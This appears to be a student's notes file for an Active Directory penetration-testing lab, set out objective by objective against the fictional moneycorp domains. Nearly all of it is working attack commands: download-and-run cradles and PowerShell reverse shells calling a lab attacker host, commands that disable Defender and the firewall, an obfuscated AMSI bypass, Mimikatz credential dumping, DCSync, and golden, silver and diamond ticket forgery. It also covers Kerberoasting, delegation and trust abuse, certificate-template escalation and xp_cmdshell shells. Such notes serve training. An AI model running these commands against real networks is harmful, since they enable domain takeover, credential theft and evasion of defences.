
![[Pasted image 20230721201051.png]]
# Domain Enumeration:
[User,computer,Domain Admin, Enterprise Admin, OU, GPO, ACLs, Forest, Trusts]
### Objective 1:
 
- Users
- Computers
- Domain Administrators
- Enterprise Administrators
```powershell
Get-DomainUser
Get-DomainUser | select -ExpandProperty <filter>
Get-DomainUser | select name, description
Get-DomainUser -identity <username>
Get-DomainUser -Domain <otherDomain>
```

```powershell
Get-DomainPolicyData
(Get-DomainPolicyData).System.Access
(Get-DomainPolicyData).KerberosPolicy
```

```powershell
Get-DomainComputer
Get-DomainComputer | select -ExpandProperty name
Get-DomainComputer -Identity <ComputerName>
```

```powershell
Get-DomainGroup
Get-DomainGroup | select -ExpandProperty name
Get-DomainGroupMember -Identity <GroupName>
Get-DomainGroup -Username <username>
Get-DomainGroup -Identity 'Domain Admins'
Get-DomainGroupMember -Identity 'Domain Admins'
```

```powershell
Get-DomainGroup -Domain 'moneycorp.local'
Get-DomainGroup -Domain <RootDomain> -Identity 'Enterprise Admins'
Get-DomainGroupMember -Domain <RootDomain> -Identity 'Enterprise Admins'
```

```powershell
####Enumerate Local Group in particular machine

Get-NetLocalGroup -ComputerName <ComputerName>
Get-NetLocalGroupMember -GroupName <GName> -ComputerName <ComputerName>
```

```powershell
####Get actively logged users on a computer
Get-NetLoggedon -ComputerName dcorp-adminsrv

####Get locally logged users on a computer
Get-LoggedonLocal -ComputerName dcorp-adminsrv

####Get the last logged user on a computer
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```

### Objective 2:

Enumerate following for the dollarcorp domain:

- List all the OUs
- List all the computers in the StudentMachines OU.
- List the GPOs
- Enumerate GPO applied on the StudentMachines OU.

```powershell

Get-DomainOU
Get-DomainOU | select -ExpandProperty name
Get-DomainOU -name <OUName> | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname
Get-DomainGPO

#####Get GPOs applied to a specific OU

(Get-DomainOU -Identity StudentMachines).gplink
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'

OR

Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11,(Get-DomainOU -Identity StudentMachines).gplink.length-72)
```

### Objective 3:

Enumerate following for the dollarcorp domain:

- ACL for the Domain Admins group
- All modify rights/permissions for the studentX

```powershell

Get-DomainObjectAcl
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -verbose


Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

```


### Objective 4: 

• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain. 
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

```powershell

Get-ForestDomain -verbose
Get-DomainTrust 

##External trusts in the moneycorp.local forest

Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust - Domain $_.Name}
```


# Local Privilege Escalation
### Objective 5:

- Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
- Identify a machine in the domain where studentx has local administrative access. 
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.


####Local Privilege Escalation And Jenkins Exploitation..
```powershell


. .\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose

OR

Get-ModifiableService
Get-ServiceUnquoted

```


Find Local Admin Privileges on other machine using `Find-PSRemotingLocalAdminAccess` Access that machine using `winrs` utility. (Lateral Movement)
```powershell

###Find machine on which the current user have admin access..

. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess



###Getting access to the machine on which student477 has local admin access...

winrs -r:dcorp-adminsrv cmd
OR
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local


####Exploiting Jenkins With Creds- builduser:builduser
####Reverse Shell Commands
Step 1: Host Invoke-PowerShellTcp.ps1 on python or HFS Server.
Step 2: Execute this cmd on target Server

powershell.exe iex (iwr http://172.16.100.77/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.77 -Port 443

OR

powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
```



# BloodHound
### Objective 6:

- Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain.

```
####Disable real time detection

Get-MpPreference
Set-MpPreference -DisableRealtimeMonitoring $true
```

```
. .\SharpHound.ps1
invoke-BloodHound -CollectionMethods All -Verbose
```
![[Pasted image 20230723130952.png]]
![[Pasted image 20230725141409.png]]

# Domain Privilege Escalation _1:

### Objective 7:

- Identify a machine in the target domain where a Domain Admin session is available. 
- Compromise the machine and escalate privileges to Domain Admin
		−Using access to dcorp-ci
		−Using derivative local admin


***Method 1:***
```powershell


Find-DomainUserLocation

winrs -r:dcorp-mgmt whoami;hostname

iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.6"

./Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::ekeys"

C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```

***Method 2:***
```powershell

####Find Domain Admin Session Available on machine
Find-DomainUserLocation 
OR
Invoke-UserHunter -CheckAccess

####Checking For Command Execution...
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt


####Loading Mimikatz on Current Machine (dcorp-ciadmin)
iex (iwr http://172.16.100.6/Invoke-Mimi.ps1 -UseBasicParsing)

####PSSeesion into a Variable
$sess = New-PSSession dcorp-mgmt.dollarcorp.moneycorp.local

####Disabling Antivirus to bypass AV Protection
Invoke-Command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess

####Calling function from current machine to target machine..
Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess


####Generating and Importing ticket using Rubeus...
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```

##### Derivative Local Admin

Machine 1(student = Local Admin) ->Machine 2 (student = Local Admin(hash Extract)) -> Machine 3 (srvadmin local admin)

student = Local Admin on Machine 2 (dcorp-adminsrv)
dcorp-adminsrv = Extracted hash of srvadmin
srvadmin = Local Admin on Machine 3 (dcorp-mgmt)

```powershell
####Extracting app locker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

###Bypass Realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose

####Transfering Invoke-Mimi.ps1 to dcorp-adminsrv
echo F | xcopy C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'


./Invoke-MimiEx.ps1


#### Performing Pass the Hash
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"

#### Checking Local Admin Access on Other Machine
Find-PSRemotingLocalAdminAccess

#### Transfering Loader.exe to 'dcorp-mgmt'
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

<Add Port Forwarding>

####Accessing dcorp-mgmt
winrs -r:dcorp-mgmt cmd

#### Extracting Keys using SafetyKatz on 'dcorp-mgmt'
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit



C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```

We can also look for credentials from the credentials vault. Interesting credentials like those used for scheduled tasksare stored in the credential vault.
```
Invoke-Mimi-Command '"token::elevate" "vault::cred /patch"'
```

# Persistent Attacks:
### Objective 8:


- Extract secrets from the domain controller of dollarcorp.
- Using the secrets of krbtgt account, create a Golden ticket. 
- Use the Golden ticket to (once again) get domain admin privileges from a machine.


##### (Golden Ticket attack)

###### Method 1:
```powershell


####Extract NTLM hashes
./Loader.exe -path http://WebServerIP/SafetyKatz.exe "lsadump::lsa /patch" "exit" 


####Extract aes256(secret),rc4 hashes using DCSYNC attack
./Loader.exe -path http://WebServerIP/SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 

####Creating Golden Ticket using Secret of krbtgt
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"


####Accessing the CIFS or filesystem
dir \\dcorp-dc\C$
```

###### Method 2: (using PSRemoting)
```powershell


. .\Invoke-Mimi.ps1

Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'

$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Invoke-Command -FilePath ./Invoke-Mimi.ps1 -Session $sess

Enter-PSSession $sess

Invoke-Mimi -Command '"lsadump::lsa /patch"' (for NTLM hash)
Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt"' (for aes256 hash krbtgt)

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

```


### Objective 9:

- Try to get command execution on the domain controller by creating silver ticket for:
	- HOST service
	- WMI


##### (Silver Ticket Attack)  

- Open `Invoke-PowershellTCP.ps1` file and Add `Power -Reverse -IPAddress 172.16.100.X -Port 443` at the bottom for Host Service Abuse for getting Reverse shell...

```powershell

####Generating Silver Ticket

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:<ServiceName> /rc4:<dcorp-dc hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

OR

Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:565d2b382152d44636f7861b98434731 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'



####Geting Reverse shell via HOST Service Ticket...

schtasks /create /S <Full_FQDN> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<AnyNameForService>" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1''')'"


#### Executing the Task
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "<AboveMentionService>"

```


### Objective 10:

- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.

#### (Diamond Ticket) 
`/ticketusersid`: SID of user for which ticket is generated.
`/groups`: SID of group like 'Domain Admins'
`/krbkey` AES256 hash of krbtgt
```powershell

Invoke-Mimi -Command '"lsadump:dcsync /user:krbtgt"' 

Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```


### Objective 11:

##### DSRM Attack

```powershell

####Enumerate DSRM or local administrator ntlm hash
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'

####Change login behaviour from registry to ptt
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior"
-Value 2 -PropertyType DWORD

####PTT using ntlm hash
Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```


### Objective 12:

##### Abuse Rights

Below are the replication rights that allow to perform DCsync attack.

**DS-Replication-Get-Changes| Replicating Directory Changes All | Replicating Directory Changes In Filtered Set**.
```powershell

####<PTT to DC>

#### Adding right for DCsync attack
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose


####Checking Rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}


#### From student machine perform DCsync attack.
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```



# Domain Privilege Escalation _2:

### Objective 14:

- Using the Kerberoast attack, crack password of a SQL server service account.

###### Method 1:  (using Rubeus)

`:1433` need to be remove before john..
```powershell

####Enumerate all accound used as a Service Account
Get-DomainUser -SPN


C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

```


###### Method 2: (PreAuthDisabled)

```powershell
####Enumerating accounts with Kerberos Preauth disabled

Get-DomainUser -PreauthNotRequired -Verbose
(OR)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
(OR)
Invoke-ASREPRoast -Verbose


####Request encrypted AS-REP

Get-ASREPHash -UserName <Username> -Verbose


####Note: Once got hash Crack with john or hashcat

```


###### Method 3: (Set_SPN)

```powershell

####Enumerate the permissions for RDPUsers on ACLs

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Get-DomainUser -Identity supportuser | select serviceprincipalname
(OR)
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName



####Set a SPN for the user 
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
(OR)
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}


Rubeus.exe kerberoast /outfile:targetedhashes.txt 

john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt

```

### Objective 15:

- Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
- Compromise the server and escalate to Domain Admin privileges. 
- Escalate to Enterprise Admins privileges by abusing Printer Bug!

##### Unconstrained Delegation
``` powershell
Username:           appadmin
aes256_hmac         68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
rc4_hmac_nt         d549831a955fee51a43c83efb3928fa7



#### Enumerate computers which have unconstrained delegation enabled 
Get-DomainComputer -UnConstrained
(OR)
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}


####<Compromise system(appadmin local admin on dcorp-appsrv)>

####PTT
C:\AD\Tools\Rubeus.exe asktgt /user:appadmin /rc4:d549831a955fee51a43c83efb3928fa7 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

####Run these commands on that machine
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'


####Inject ticket into current Powershell Session on Compromise Machine..
Invoke-Mimikatz -Command '"kerberos::ptt <filename>.kirbi"'

```


For dcorp-dc escalation to DA
```powershell

####Tranfer rubeus to dcorp-appsrv where uncontrained delegation enabled
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y

####winrs to dcorp-appsrv
winrs -r:dcorp-appsrv cmd

####Listening for ticket using rubeus
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

####Force dcorp-dc to authenticate itself to dcorp-appsrv
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

####On student VM, Inject the ticket in current powershell session.
C:\AD\Tools\Rubeus.exe ptt /ticket:<base64_ticket>

####Perform DCsysc attack
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

```

For mcorp-dc escalate to EA
```powershell

####Listening ticket for mcorp-dc
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

####Force Mcorp-dc to authenticate iteself to dcorp-appsrv
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

```

### Objective 16:

- Enumerate users in the domain for whom Constrained Delegation is enabled.
	- For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
	- Pass the ticket and access the service. 
- Enumerate computer accounts in the domain for which Constrained Delegation is enabled. 
	- For such a user, request a TGT from the DC.
	- Obtain an alternate TGS for LDAP service on the target machine. 
	- Use the TGS for executing DCSync attack.


##### Constrained Delegation

 ***[+] Abuse users where Constrained Delegation Enabled***

*(using rubeus)*
```powershell

####Enumerate user where contrained delegation enable
Get-DomainUser -TrustedToAuth

####Request TGT and TGS for CIFS service
C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:<websvc_hash> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

####Access file system
dir\\dcorp-mssql.dollarcorp.moneycorp.local\c$

```


*(using kekeo)*
```powershell

.\kekeo.exe

####request a TGT from websvc
tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<websvc_rc4_hash>

####request a TGS using TGT
tgs::s4u /tgt:<filename>.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL

####inject the ticket in current session
Invoke-Mimi-Command '"kerberos::ptt <filename>.kirbi"'

dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

```


***[+] Abusing Computers where Constrained Delegation is enabled***
 
*(Using Rubeus)*
```powershell

####Enumerate Computer on which Contrained Delegation Enabled
Get-DomainComputer -TrustedToAuth


####Request TGT and TGS
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<adminsrv hash> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt


####Perform DCsync attack via ldap service
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

*(using kekeo)*
```powershell

./kekeo.exe

####Request TGT
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:<adminsrv rc4 hash>

####Requsting a TGS 
tgs::s4u /tgt: <filename>.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL

####Inject ticket intrust_tkt.kirbi current session
Invoke-Mimi-Command '"kerberos::ptt <filename>.kirbi"'
```


### Objective 18:

- Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.

##### Trust Key Abuse

`dollarcorp.moneycorp.local` ->  `moneycorp.local`

`/sid`: Current domain SID 
`/sids` : Enterprise group SID


Forge TGT using Trust key ->  Request TGS
```powershell

####Retrive trust keys from dcorp-dc
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "lsadump::trust /patch" "exit"

#### Forge Inter-realm TGT and save it into 'trust_tkt.kirbi'
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:<trust_key> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

####Request TGS using Inter-realm TGT (TGS for cifs)
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

dir \\mcorp-dc.moneycorp.local\c$

##Note: With this TGT We can also request for HOST Service and get reverse shell..
```


### Objective 19:

- Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.

`/sid`: current domain SID `(Get-DomainSID)`
`/sids`: EA group SID. `(Get-DomainGroup 'Enterprise Admins' -Domain moneycorp.local)`
`/krbtgt`: hash of krbtgt of current domain.
```powershell
##Golden Ticket for escalation to parent domain
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"


dir \\mcorp-dc.moneycorp.local\c$

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

####It is also possible to get a reverse shell via HOST Service to abuse a schedule task.

```


### objective 20:

- With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
`/sid`: current domain SID
`/sids`:EA group domain SID


```powershell

####Abuse trust key accross forest eurocorp.local creating inter-realm TGT
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:<trust_key> /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

####Request TGS using inter-realm TGT
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

dir \\dcorp-dc\SharedwithDCorp\
```

### Objective 21:

- Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.

```powershell

####Check For AD CS
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find
```

***[+] Privilege Escalation to DA and EA using ESC1***

These attribute need to be check to exploit..
1. `Template Name` : Name of the template
2. `msPKI-Certificates-Name-Flag`  It must be set to `ENROLLEE_SUPPLIES_SUBJECT` to request  a certificate as any user.
3. `Enrollment Rights` : User or group who have the enrolment rights.

*Domain Admin Escalation*
```powershell

####Enumerate template where ENROLLEE_SUPPLIES_SUBJECT set on msPKI-Certificates-Name-Flag
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

####Request a certificate for dollercorp.moneycorp.local\administrator
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"<template_name>" /altname:administrator

```

*Enterprise Admin Escalation*
```powershell

####Request Certificat for moneycorp.local\administrator
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"<template_name>" /altname:moneycorp.local\administrator

```

Copy all the text between `-----BEGIN RSA PRIVATE KEY-----`  and ` -----END CERTIFICATE----- `and save it to `esc1.pem`

```powershell

####Convert it to PFX to use it with rubeus.
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx

<Export Password>

####Request TGT using Certificate
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt


winrs -r:dcorp-dc cmd
(or)
winrs -r:mcorp-dc cmd
```


***[+] Privilege Escalation to DA and EA using ESC3***

```
C:\AD\Tools\Certify.exe find /vulnerable




```



### objective 22:

- Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.

```powershell

####ImportPowerUpSQL in memory
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1

####Enumerate all SQL server in domain and try to connect using current user privileges.
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose


####Crawls database links automatically..
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose


####If xp_cmdshell is enabled It is possible to execute commands
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"


####Netcat listner for reverse shell..
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443


####Bypass AMSI and Scriptblock logging and execute our reverse shell script on target server..
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql

```


PREREQUISITE Cradles:

```powershell
iex((New-Object Net.WebClient).DownloadString('http://172.16.99.11/PowerView.ps1'))
```

```powershell
iex (iwr http://<IP Address>/powerview.ps1 -UseBasicParsing)
```

```powershell
iwr http://<IP Address>/<fileName> -OutFile <File Path>
```

```powershell
echo F | xcopy <FileName> \\dcorp-dc\C$\Public\<FileName>
```

##Route Set command
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.6
```

###AMSI Bypass
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

###Load `powershell script` without touching disk.
```powershell
powershell.exe iex (iwr http://172.16.100.77/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```


###Bypass Security mechanism. 
```powershell
powershell -ep bypass;Set-MpPreference -DisableRealtimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

